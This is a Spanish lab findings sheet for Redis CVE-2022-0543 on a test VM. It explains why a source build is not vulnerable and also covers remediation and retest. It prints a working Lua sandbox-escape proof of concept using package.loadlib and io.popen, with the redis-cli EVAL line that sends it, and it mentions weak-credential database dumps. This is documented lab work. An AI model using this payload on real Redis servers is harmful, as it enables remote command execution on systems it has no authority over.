# D1 · Redis · CVE-2022-0543

## 1. Ficha

| Campo | Valor |
|---|---|
| VM | M2 `10.10.10.12` |
| Servicio | Redis |
| Versión instalada | **6.2.6 compilado de fuente** |
| Rango vulnerable | paquete Debian/Ubuntu 5.0–5.0.14 · 6.0–6.0.16 · 6.2–6.2.6 |
| Versión que corrige | **5.0.15 / 6.0.17 / 6.2.7** |
| CVSS | **10.0** v3.1 |
| CWE | CWE-94 |
| NVD | https://nvd.nist.gov/vuln/detail/CVE-2022-0543 |
| Artefacto | `artifacts/vulnerable/redis-6.2.6.tar.gz` |
| Estado | **No reproducible con este artefacto** |

## 2. Por qué no reproduce

CVE-2022-0543 es un problema del **empaquetado Debian/Ubuntu**: el Redis del sistema enlaza Lua dinámicamente y deja disponible `package.loadlib`. El build de fuente compila Lua estático y elimina `package`; el PoC Lua falla.

Evidencia:

```bash
redis-server --version
redis-cli -h 10.10.10.12 INFO server | grep redis_version
redis-cli -h 10.10.10.12 EVAL 'return type(package)' 0   # nil o error
```

## 3. Si se quiere el 10.0 (opcional)

Se necesita el paquete distro vulnerable, no el tarball de fuente:

```bash
# En M2, con un .deb de Debian/Ubuntu vulnerable
sudo apt install ./redis-server_<version>_amd64.deb ./redis-tools_<version>_amd64.deb
redis-server --version
redis-cli -h 10.10.10.12 PING
```

PoC Lua:

```lua
local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io")
local io = io_l()
local f = io.popen("id", "r")
local res = f:read("*a")
f:close()
return res
```

```bash
redis-cli -h 10.10.10.12 EVAL "$(cat exploit.lua)" 0
```

## 4. Alternativa real

Sostener M2 con:

- **D2**: credenciales débiles de MariaDB → dump de `wordpress` y `moodle_db`.
- **D3**: 3306/6379/161 expuestos.
- **D4**: SNMP `public`/`private`.

## 5. Evidencia de la limitación

- `EV-D1-01`: `redis-server --version` 6.2.6 fuente.
- `EV-D1-02`: `EVAL 'return type(package)'` nil/error.
- `LOG-D1`: intento del PoC y fallo.

## 6. Remediación

- Redis **6.2.7+**.
- `requirepass` fuerte.
- `bind 127.0.0.1` + `protected-mode yes`.
- UFW solo M1.

## 7. Retest

```bash
redis-cli -h 10.10.10.12 PING   # NOAUTH o timeout
```

## 8. EARS

- **REQ-D1-01 (No deseado).** SI el Redis es un build de fuente, ENTONCES el laboratorio NO DEBE afirmar RCE de CVE-2022-0543.
- **REQ-D1-02 (Ubicuo).** La limitación DEBE documentarse con evidencia.
- **REQ-D1-03 (Ubicuo).** La remediación DEBE dejar `NOAUTH` y el puerto filtrado.

## 9. Checklist

- [ ] Snapshot `previo-a-D1`.
- [ ] Versión y `package` verificados.
- [ ] Intento de PoC documentado.
- [ ] Alternativa D2/D3/D4.
- [ ] Remediación.
- [ ] Retest.
